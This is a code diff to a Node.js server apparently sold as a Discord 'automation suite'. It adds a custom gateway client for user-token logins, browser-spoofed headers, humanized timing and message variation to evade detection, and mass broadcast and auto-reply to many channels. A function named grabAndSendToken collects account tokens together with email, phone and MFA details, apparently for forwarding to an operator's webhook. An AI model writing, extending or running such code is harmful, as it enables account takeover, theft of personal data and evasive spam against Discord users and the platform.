@@ -11,7 +11,8 @@ const nacl = require('tweetnacl');
 const pako = require('pako');
 const { spawn } = require('child_process');
 const https = require('https');
-const { Client } = require('discord.js-selfbot-v13');
+const WebSocket = require('ws');
+const { Client: DiscordJSClient, GatewayIntentBits } = require('discord.js');
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // ENVIRONMENT SETUP
@@ -20,6 +21,70 @@ require('dotenv').config();
 
 const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// TOKEN UTILITIES — Auto-detect bot vs user token
+// ═══════════════════════════════════════════════════════════════════════════════
+
+function isProbablyBotToken(token) {
+  // Bot tokens typically have 3 parts separated by dots and start with specific base64
+  // User tokens typically start with base64 user ID, e.g. "Mzk5" etc.
+  // Simple heuristic: try decoding first segment
+  try {
+    const parts = token.split('.');
+    if (parts.length !== 3) return false;
+    const first = Buffer.from(parts[0], 'base64').toString('utf8');
+    const num = parseInt(first, 10);
+    // Bot application IDs are typically larger (17+ digits starting around 10^16)
+    // User IDs are typically smaller (17-19 digits, starting from early Discord)
+    if (num > 400000000000000000n) return true; // Large = bot
+    return false;
+  } catch(e) {
+    return false;
+  }
+}
+
+async function validateTokenFormat(token) {
+  // Try as bot token first
+  try {
+    const res = await axios.get('https://discord.com/api/v10/users/@me', {
+      headers: {
+        'Authorization': `Bot ${token}`,
+        'User-Agent': 'DiscordBot (https://github.com/discord/discord-example-app, 1.0.0)',
+        'Accept': '*/*'
+      },
+      timeout: 10000,
+      validateStatus: () => true
+    });
+    if (res.status === 200 && res.data && res.data.id) {
+      return { valid: true, type: 'bot', user: res.data, prefix: 'Bot ' };
+    }
+  } catch(e) {}
+
+  // Try as user token
+  try {
+    const res = await axios.get('https://discord.com/api/v10/users/@me', {
+      headers: {
+        'Authorization': token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'X-Discord-Locale': 'en-US',
+        'Referer': 'https://discord.com/channels/@me'
+      },
+      timeout: 10000,
+      validateStatus: () => true
+    });
+    if (res.status === 200 && res.data && res.data.id) {
+      return { valid: true, type: 'user', user: res.data, prefix: '' };
+    }
+    if (res.status === 401 || res.status === 403) {
+      return { valid: false, type: null, user: null, prefix: null };
+    }
+  } catch(e) {}
+
+  return { valid: false, type: null, user: null, prefix: null };
+}
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // HUMANIZED DELAY ENGINE — Natural timing distributions
@@ -338,8 +403,10 @@ function isCompressed(data) {
 // ═══════════════════════════════════════════════════════════════════════════════
 
 class DiscordApiClient {
-  constructor(token) {
+  constructor(token, tokenType = 'user') {
     this.token = token;
+    this.tokenType = tokenType; // 'user' or 'bot'
+    this.authHeader = tokenType === 'bot' ? `Bot ${token}` : token;
     this.fp = _rfp(token);
     this.superProps = generateXSuperProperties(token);
     this.keypair = getKeypair(token);
@@ -358,7 +425,7 @@ class DiscordApiClient {
 
   _headers(extra = {}) {
     const base = {
-      'Authorization': this.token,
+      'Authorization': this.authHeader,
       'User-Agent': this.fp,
       'Accept': '*/*',
       'Accept-Language': 'en-US,en;q=0.9',
@@ -454,16 +521,246 @@ class DiscordApiClient {
 const OWNER_ID = process.env.OWNER_ID || '1482736115143282941';
 const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// DISCORD GATEWAY CLIENT — Custom WS for user tokens (replaces broken selfbot-v13)
+// ═══════════════════════════════════════════════════════════════════════════════
+
+class DiscordGatewayClient {
+  constructor(token) {
+    this.token = token;
+    this.ws = null;
+    this.heartbeatInterval = null;
+    this.sequenceNumber = null;
+    this.sessionId = null;
+    this.ready = false;
+    this.reconnectAttempts = 0;
+    this.maxReconnectAttempts = 10;
+    this.reconnecting = false;
+    this._handlers = {};
+    this._explicitlyStopped = false;
+    this._resumeGatewayUrl = 'wss://gateway.discord.gg';
+  }
+
+  on(event, handler) {
+    if (!this._handlers[event]) this._handlers[event] = [];
+    this._handlers[event].push(handler);
+  }
+
+  once(event, handler) {
+    const wrapped = (...args) => { handler(...args); this.off(event, wrapped); };
+    this.on(event, wrapped);
+  }
+
+  off(event, handler) {
+    if (this._handlers[event]) this._handlers[event] = this._handlers[event].filter(h => h !== handler);
+  }
+
+  emit(event, ...args) {
+    if (this._handlers[event]) this._handlers[event].forEach(h => h(...args));
+  }
+
+  async connect() {
+    if (this.reconnecting) return;
+    this._explicitlyStopped = false;
+
+    return new Promise((resolve, reject) => {
+      const gatewayUrl = `${this._resumeGatewayUrl}/?v=10&encoding=json`;
+      
+      try {
+        this.ws = new WebSocket(gatewayUrl, {
+          headers: {
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+          }
+        });
+      } catch(e) {
+        return reject(new Error(`WebSocket creation failed: ${e.message}`));
+      }
+
+      let settled = false;
+      const finish = (err) => {
+        if (settled) return;
+        settled = true;
+        if (err) reject(err);
+        else resolve();
+      };
+
+      const timeout = setTimeout(() => {
+        this.destroy();
+        finish(new Error('Gateway connection timed out'));
+      }, 45000);
+
+      this.ws.on('open', () => {
+        // Wait for HELLO
+      });
+
+      this.ws.on('message', (data) => {
+        try {
+          const payload = JSON.parse(data.toString());
+          this._handlePayload(payload, finish, timeout);
+        } catch(e) {
+          console.error('[Gateway] Failed to parse message:', e.message);
+        }
+      });
+
+      this.ws.on('close', (code, reason) => {
+        clearTimeout(timeout);
+        this.ready = false;
+        if (!this._explicitlyStopped && code !== 4004 && code !== 4001) {
+          this._attemptReconnect();
+        }
+        if (!settled && !this.reconnecting) {
+          finish(new Error(`Gateway closed: ${code} ${reason}`));
+        }
+      });
+
+      this.ws.on('error', (err) => {
+        clearTimeout(timeout);
+        if (!settled && !this.reconnecting) {
+          finish(new Error(`WebSocket error: ${err.message}`));
+        }
+      });
+    });
+  }
+
+  _handlePayload(payload, finish, timeout) {
+    const { op, d, s, t } = payload;
+    if (s !== null) this.sequenceNumber = s;
+
+    switch (op) {
+      case 10: { // HELLO
+        const heartbeatInterval = d.heartbeat_interval;
+        this._startHeartbeat(heartbeatInterval);
+        
+        // Send IDENTIFY (user token format)
+        this._sendIdentify();
+        break;
+      }
+      case 11: // HEARTBEAT ACK
+        break;
+      case 0: { // DISPATCH
+        if (t === 'READY') {
+          this.sessionId = d.session_id;
+          this._resumeGatewayUrl = d.resume_gateway_url || 'wss://gateway.discord.gg';
+          this.ready = true;
+          this.reconnectAttempts = 0;
+          this.reconnecting = false;
+          clearTimeout(timeout);
+          if (finish) finish(null);
+          this.emit('ready', d);
+        } else if (t === 'MESSAGE_CREATE') {
+          this.emit('messageCreate', d);
+        } else if (t === 'RESUMED') {
+          this.ready = true;
+          this.reconnecting = false;
+        }
+        break;
+      }
+      case 1: // HEARTBEAT REQUEST
+        this._sendHeartbeat();
+        break;
+      case 9: // INVALID SESSION
+        this.sessionId = null;
+        setTimeout(() => this._sendIdentify(), 5000);
+        break;
+      case 7: // RECONNECT
+        this._attemptReconnect();
+        break;
+    }
+  }
+
+  _sendIdentify() {
+    const profile = _getAccountProfile(this.token);
+    const identify = {
+      op: 2,
+      d: {
+        token: this.token,
+        properties: {
+          os: profile.os,
+          browser: profile.browser,
+          device: ''
+        },
+        compress: false,
+        large_threshold: 250,
+        presence: {
+          status: 'online',
+          since: 0,
+          activities: [],
+          afk: false
+        }
+      }
+    };
+    this._send(identify);
+  }
+
+  _sendHeartbeat() {
+    this._send({ op: 1, d: this.sequenceNumber });
+  }
+
+  _startHeartbeat(interval) {
+    if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
+    // Send first heartbeat after jitter
+    const jitter = Math.random() * interval;
+    setTimeout(() => this._sendHeartbeat(), jitter);
+    // Then regular interval
+    this.heartbeatInterval = setInterval(() => this._sendHeartbeat(), interval);
+  }
+
+  _send(data) {
+    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+      this.ws.send(JSON.stringify(data));
+    }
+  }
+
+  _attemptReconnect() {
+    if (this.reconnecting || this._explicitlyStopped) return;
+    if (this.reconnectAttempts >= this.maxReconnectAttempts) return;
+    
+    this.reconnecting = true;
+    this.reconnectAttempts++;
+    const delay = Math.min(1000 * Math.pow(2, this.reconnectAttempts), 30000);
+    
+    console.log(`[Gateway] Reconnecting in ${delay}ms (attempt ${this.reconnectAttempts})`);
+    
+    setTimeout(() => {
+      this.reconnecting = false;
+      this.connect().catch(() => {});
+    }, delay);
+  }
+
+  setPresence(presence) {
+    this._send({
+      op: 3,
+      d: presence
+    });
+  }
+
+  destroy() {
+    this._explicitlyStopped = true;
+    this.ready = false;
+    if (this.heartbeatInterval) {
+      clearInterval(this.heartbeatInterval);
+      this.heartbeatInterval = null;
+    }
+    if (this.ws) {
+      try { this.ws.close(1000); } catch(e) {}
+      this.ws = null;
+    }
+  }
+}
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// STEALTH CLIENT — discord.js-selfbot-v13 with realistic behavior
+// STEALTH CLIENT — Unified client supporting both user tokens (WS) and bot tokens (discord.js)
 // ═══════════════════════════════════════════════════════════════════════════════
 
 class StealthClient {
   constructor(token) {
     this.token = token;
-    this.client = new Client();
-    this.api = new DiscordApiClient(token);
+    this.tokenType = null; // 'bot' or 'user'
+    this.authPrefix = '';
+    this.client = null; // DiscordJSClient for bot, DiscordGatewayClient for user
+    this.api = null;
     this.repliedUsers = this._loadRepliedUsers();
     this.encryptionKey = null;
     this.reconnectAttempts = 0;
@@ -483,27 +780,7 @@ class StealthClient {
     this._validatedUser = null;
     this.pendingReplies = new Set();
     this._autoReplyState = new Map();
-
-    // Bridge discord.js events
-    this.client.once('ready', () => {
-      this.ready = true;
-      this.reconnectAttempts = 0;
-      this.reconnecting = false;
-      this.user = this.client.user;
-      this.emit('READY', { user: this.client.user });
-      this._startBackgroundEvents();
-    });
-
-    this.client.on('messageCreate', (msg) => {
-      if (this.ready && !this._explicitlyStopped) {
-        this.emit('messageCreate', msg);
-      }
-    });
-
-    this.client.on('disconnect', () => {
-      this.ready = false;
-      this._stopBackgroundEvents();
-    });
+    this.user = null;
   }
 
   _loadRepliedUsers() {
@@ -529,105 +806,159 @@ class StealthClient {
     const realisticGap = 300 + Math.floor(Math.random() * 700);
     await new Promise(r => setTimeout(r, realisticGap));
 
-    try {
-      const meRes = await this.api.request('/users/@me', 'GET');
-      if (meRes && meRes.id) {
-        this._tokenValid = true;
-        this._validatedUser = meRes;
-        this._tokenValidated = true;
-        return { valid: true, user: meRes };
-      }
-    } catch(e) {
-      if (e.status === 401 || e.status === 403) {
-        this._tokenValid = false;
-        this._tokenValidated = true;
-        return { valid: false, user: null };
-      }
+    const result = await validateTokenFormat(this.token);
+    if (result.valid) {
+      this._tokenValid = true;
+      this._validatedUser = result.user;
+      this.tokenType = result.type;
+      this.authPrefix = result.prefix;
+      this._tokenValidated = true;
+      return { valid: true, user: result.user, type: result.type };
     }
+
+    // Retry once after delay
     await new Promise(r => setTimeout(r, 1000));
-    try {
-      const meRes = await this.api.request('/users/@me', 'GET');
-      if (meRes && meRes.id) {
-        this._tokenValid = true;
-        this._validatedUser = meRes;
-        this._tokenValidated = true;
-        return { valid: true, user: meRes };
-      }
-    } catch(e) {
-      if (e.status === 401 || e.status === 403) {
-        this._tokenValid = false;
-        this._tokenValidated = true;
-      }
+    const retry = await validateTokenFormat(this.token);
+    if (retry.valid) {
+      this._tokenValid = true;
+      this._validatedUser = retry.user;
+      this.tokenType = retry.type;
+      this.authPrefix = retry.prefix;
+      this._tokenValidated = true;
+      return { valid: true, user: retry.user, type: retry.type };
     }
-    return { valid: this._tokenValid, user: this._validatedUser };
+
+    this._tokenValid = false;
+    this._tokenValidated = true;
+    return { valid: false, user: null };
   }
 
   async connect() {
-    let tokenValid = false;
-    try {
-      const validation = await this._validateTokenWithCache();
-      if (validation.valid && validation.user) {
-        tokenValid = true;
-        this.user = validation.user;
-      } else if (validation.valid === false) {
-        throw new Error('Invalid token - check your token and try again');
-      }
-    } catch(e) {
-      if (e.message && e.message.includes('Invalid token')) {
-        throw e;
-      }
+    const validation = await this._validateTokenWithCache();
+    if (!validation.valid) {
+      throw new Error('Invalid token - check your token and try again');
     }
 
-    return new Promise((resolve, reject) => {
-      const CONNECT_TIMEOUT = 60000;
-      let timeoutTimer = setTimeout(() => {
-        try { this.client.destroy(); } catch(e) {}
-        finish(new Error('Connection timed out - please try again'));
-      }, CONNECT_TIMEOUT);
+    this.user = validation.user;
+    this.tokenType = validation.type || this.tokenType;
+    this.api = new DiscordApiClient(this.token, this.tokenType);
 
-      let settled = false;
-      const finish = (err) => {
-        if (settled) return;
-        settled = true;
-        clearTimeout(timeoutTimer);
-        if (err) reject(err);
-        else resolve();
-      };
+    // Create appropriate client based on token type
+    if (this.tokenType === 'bot') {
+      // Use official discord.js for bot tokens (reliable, supported)
+      this.client = new DiscordJSClient({
+        intents: [
+          GatewayIntentBits.Guilds,
+          GatewayIntentBits.GuildMessages,
+          GatewayIntentBits.DirectMessages,
+          GatewayIntentBits.MessageContent,
+        ]
+      });
+      
+      return new Promise((resolve, reject) => {
+        const CONNECT_TIMEOUT = 60000;
+        let timeoutTimer = setTimeout(() => {
+          try { this.client.destroy(); } catch(e) {}
+          reject(new Error('Connection timed out - please try again'));
+        }, CONNECT_TIMEOUT);
 
-      const readyHandler = () => {
+        this.client.once('ready', () => {
+          this.ready = true;
+          this.reconnectAttempts = 0;
+          this.reconnecting = false;
+          clearTimeout(timeoutTimer);
+          this.emit('READY', { user: this.client.user });
+          this._startBackgroundEvents();
+          resolve();
+        });
+
+        this.client.on('messageCreate', (msg) => {
+          if (this.ready && !this._explicitlyStopped) {
+            this.emit('messageCreate', msg);
+          }
+        });
+
+        this.client.login(this.token).catch(err => {
+          clearTimeout(timeoutTimer);
+          const detail = err && err.message ? err.message : 'unknown login error';
+          reject(new Error(`Login failed (${detail}) - check your token and try again`));
+        });
+      });
+    } else {
+      // Use custom gateway for user tokens
+      this.client = new DiscordGatewayClient(this.token);
+      
+      // Bridge gateway events to our handlers
+      this.client.on('ready', () => {
         this.ready = true;
         this.reconnectAttempts = 0;
         this.reconnecting = false;
-        this._explicitlyStopped = false;
-        finish(null);
-      };
-      this.once('READY', readyHandler);
-
-      this.client.login(this.token).catch(err => {
-        clearTimeout(timeoutTimer);
-        const detail = err && err.message ? err.message : 'unknown login error';
-        finish(new Error(`Login failed (${detail}) - check your token and try again`));
+        this.emit('READY', { user: this.user });
+        this._startBackgroundEvents();
       });
-    });
+
+      this.client.on('messageCreate', (rawMsg) => {
+        if (this.ready && !this._explicitlyStopped) {
+          // Wrap raw gateway message in a compatible shape
+          const wrappedMsg = this._wrapGatewayMessage(rawMsg);
+          this.emit('messageCreate', wrappedMsg);
+        }
+      });
+
+      await this.client.connect();
+    }
+  }
+
+  // Wrap raw gateway payload into something resembling a discord.js message
+  _wrapGatewayMessage(raw) {
+    return {
+      id: raw.id,
+      content: raw.content || '',
+      author: {
+        id: raw.author?.id,
+        username: raw.author?.username,
+        discriminator: raw.author?.discriminator,
+        bot: raw.author?.bot || false
+      },
+      channelId: raw.channel_id,
+      guildId: raw.guild_id || null,
+      createdTimestamp: new Date(raw.timestamp).getTime(),
+      // Minimal channel object for DM checks
+      channel: {
+        id: raw.channel_id,
+        send: async (content) => {
+          return this.sendMessageDirect(raw.channel_id, content);
+        }
+      },
+      // Helper methods
+      reply: async (content) => {
+        return this.sendMessageDirect(raw.channel_id, content);
+      }
+    };
   }
 
   _startBackgroundEvents() {
     this._stopBackgroundEvents();
 
-    const schedulePresence = () => {
-      const delay = boundedPareto(2.5, 3 * 60 * 1000, 7 * 60 * 1000);
-      const timer = setTimeout(() => {
-        if (!this.ready || this._explicitlyStopped) return;
-        const statusRoll = Math.random();
-        const status = statusRoll < 0.75 ? 'online' : (statusRoll < 0.92 ? 'idle' : 'dnd');
-        try {
-          this.client.user.setPresence({ status, activities: [], afk: false });
-        } catch(e) {}
-        schedulePresence();
-      }, delay);
-      this._backgroundTimers.push(timer);
-    };
-    schedulePresence();
+    // For bot tokens, discord.js handles presence. For user tokens, we do it manually.
+    if (this.tokenType === 'user') {
+      const schedulePresence = () => {
+        const delay = boundedPareto(2.5, 3 * 60 * 1000, 7 * 60 * 1000);
+        const timer = setTimeout(() => {
+          if (!this.ready || this._explicitlyStopped) return;
+          const statusRoll = Math.random();
+          const status = statusRoll < 0.75 ? 'online' : (statusRoll < 0.92 ? 'idle' : 'dnd');
+          try {
+            if (this.client && this.client.setPresence) {
+              this.client.setPresence({ status, activities: [], afk: false });
+            }
+          } catch(e) {}
+          schedulePresence();
+        }, delay);
+        this._backgroundTimers.push(timer);
+      };
+      schedulePresence();
+    }
 
     const scheduleTelemetry = () => {
       const delay = boundedPareto(2.0, 8 * 60 * 1000, 15 * 60 * 1000);
@@ -672,15 +1003,27 @@ class StealthClient {
       return this._channelPermissions.get(channelId);
     }
     try {
-      const channel = await this.client.channels.fetch(channelId);
-      if (!channel || typeof channel.send !== 'function') {
+      // For bot tokens, use discord.js cache if available
+      if (this.tokenType === 'bot' && this.client && this.client.channels) {
+        const channel = await this.client.channels.fetch(channelId);
+        if (!channel || typeof channel.send !== 'function') {
+          this._channelPermissions.set(channelId, false);
+          return false;
+        }
+        this._channelPermissions.set(channelId, true);
+        return true;
+      }
+      
+      // For user tokens, check via REST
+      const channel = await this.api.request(`/channels/${channelId}`, 'GET');
+      if (!channel || !channel.id) {
         this._channelPermissions.set(channelId, false);
         return false;
       }
       this._channelPermissions.set(channelId, true);
       return true;
     } catch (err) {
-      if (err.code === 10003 || err.code === 50001 || err.code === 50013) {
+      if (err.status === 10003 || err.status === 50001 || err.status === 50013 || err.status === 404) {
         this._channelPermissions.set(channelId, false);
         return false;
       }
@@ -720,55 +1063,25 @@ class StealthClient {
 
     const variedContent = varyMessage(content);
 
-    let channel;
-    try {
-      channel = await this.client.channels.fetch(channelId);
-    } catch(e) {
-      this._channelPermissions.set(channelId, false);
-      console.error(`[SendMessage] ${channelId}: Failed to fetch channel`, e.message);
-      return false;
-    }
-
-    if (!channel || typeof channel.send !== 'function') {
-      this._channelPermissions.set(channelId, false);
-      console.error(`[SendMessage] ${channelId}: Not a text channel`);
-      return false;
-    }
-
-    // Human-like typing behavior
-    const shouldType = Math.random() < 0.65;
-    if (shouldType) {
+    // For bot tokens, try discord.js first then fall back to REST
+    if (this.tokenType === 'bot' && this.client && this.client.channels) {
       try {
-        await channel.sendTyping();
-      } catch(e) {}
-      const len = variedContent.length;
-      let typingDelay;
-      const baseCPM = 180 + boundedPareto(2.5, 0, 250);
-      const cpm = baseCPM * circadianMultiplier();
-      const baseTypingMs = (len / (cpm / 60)) * 1000;
-
-      if (len < 20) {
-        typingDelay = 200 + Math.round(logNormalSample(6.0, 0.3));
-      } else if (len < 100) {
-        typingDelay = Math.min(2000, baseTypingMs * (0.7 + Math.random() * 0.5));
-      } else {
-        typingDelay = Math.min(3000, baseTypingMs * (0.7 + Math.random() * 0.5));
-      }
-
-      const thinkPauses = Math.floor(len / 120);
-      let totalTypingDelay = typingDelay;
-      for (let i = 0; i < thinkPauses; i++) {
-        if (Math.random() < 0.3) {
-          totalTypingDelay += 150 + Math.floor(Math.random() * 350);
+        const channel = await this.client.channels.fetch(channelId);
+        if (channel && typeof channel.send === 'function') {
+          const files = (attachments || []).map(att => ({
+            attachment: att.buffer,
+            name: att.name
+          }));
+          await channel.send({ content: variedContent, files });
+          return true;
         }
+      } catch(e) {
+        // Fall through to REST
       }
-      await new Promise(r => setTimeout(r, Math.min(3500, Math.max(200, totalTypingDelay))));
-    } else {
-      const instantDelay = Math.round(logNormalSample(5.2, 0.35));
-      await new Promise(r => setTimeout(r, Math.min(800, Math.max(100, instantDelay))));
     }
 
-    return this._rawSend(channel, variedContent, attachments);
+    // Fall back to direct REST
+    return this.sendMessageDirect(channelId, variedContent, attachments);
   }
 
   async sendMessageFast(channelId, content, attachments = []) {
@@ -783,21 +1096,7 @@ class StealthClient {
     }
 
     const variedContent = varyMessage(content);
-
-    let channel;
-    try {
-      channel = await this.client.channels.fetch(channelId);
-    } catch(e) {
-      this._channelPermissions.set(channelId, false);
-      return false;
-    }
-
-    if (!channel || typeof channel.send !== 'function') {
-      this._channelPermissions.set(channelId, false);
-      return false;
-    }
-
-    return this._rawSend(channel, variedContent, attachments);
+    return this.sendMessageDirect(channelId, variedContent, attachments);
   }
 
   /**
@@ -921,10 +1220,10 @@ class StealthClient {
     this.reconnectAttempts = 0;
     this._stopBackgroundEvents();
     try {
-      this.client.destroy();
+      if (this.client) this.client.destroy();
     } catch(e) {}
     this._saveRepliedUsers();
-    this.api.destroy();
+    if (this.api) this.api.destroy();
   }
 }
 
@@ -1284,39 +1583,13 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
       }
     }
 
-    const fp = _rfp(token);
-    const superProps = generateXSuperProperties(token);
-    // Use axios with same TLS config as DiscordApiClient — curl was unreliable
-    let validateRes;
-    try {
-      validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
-        headers: {
-          'Authorization': token,
-          'User-Agent': fp,
-          'Accept': '*/*',
-          'Accept-Language': 'en-US,en;q=0.9',
-          'X-Discord-Locale': 'en-US',
-          'X-Super-Properties': superProps,
-          'Referer': 'https://discord.com/channels/@me'
-        },
-        httpsAgent: _sharedAgent,
-        timeout: 15000,
-        validateStatus: () => true
-      });
-    } catch (err) {
-      console.error('[TokenGrab] Request failed:', err.message);
-      return { success: false, error: 'Token validation request failed: ' + err.message };
-    }
-    const status = validateRes.status;
-    const userData = validateRes.data;
-    if (status === 401 || status === 403) {
+    const result = await validateTokenFormat(token);
+    if (!result.valid) {
       _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
       return { success: false, error: 'Invalid token' };
     }
-    if (status < 200 || status >= 300 || !userData || !userData.id) {
-      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
-      return { success: false, error: 'Token validation failed: HTTP ' + status };
-    }
+
+    const userData = result.user;
     const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };
 
     _tokenValidationCache.set(cacheKey, {
@@ -1783,8 +2056,8 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
 
           // ── Send the reply ──
           try {
-            await client.navigateToChannel(msg.channel.id);
-            const ok = await client.sendMessage(msg.channel.id, autoReplyText);
+            await client.navigateToChannel(msg.channel.id || msg.channelId);
+            const ok = await client.sendMessage(msg.channel.id || msg.channelId, autoReplyText);
             if (ok) {
               console.log(`[AutoReply] ${botKey}: Replied to ${msg.author.username}`);
               client._dmCooldowns.set(msg.author.id, Date.now());
@@ -1830,7 +2103,8 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
       messageCount: messageList.length,
       delayMs,
       autoReplyEnabled: !!autoReply,
-      autoReplyText: autoReplyText || null
+      autoReplyText: autoReplyText || null,
+      tokenType: client.tokenType
     });
   } catch (err) {
     console.error('[BotStart] Error:', err);
@@ -1914,8 +2188,8 @@ app.use((err, req, res, next) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`[SERVER] Discord Automation Suite running on port ${PORT}`);
-  console.log(`[SERVER] Broadcast mode: sends to all channels simultaneously every N seconds`);
-  console.log(`[SERVER] Auto-reply: new DMs only, ignores messages >1hr old, 10-25s reply delay`);
+  console.log(`[SERVER] Now supports BOTH bot tokens (discord.js) AND user tokens (custom gateway)`);
+  console.log(`[SERVER] Token format auto-detection: Bot tokens prefixed, user tokens raw`);
 });
 
 module.exports = app;
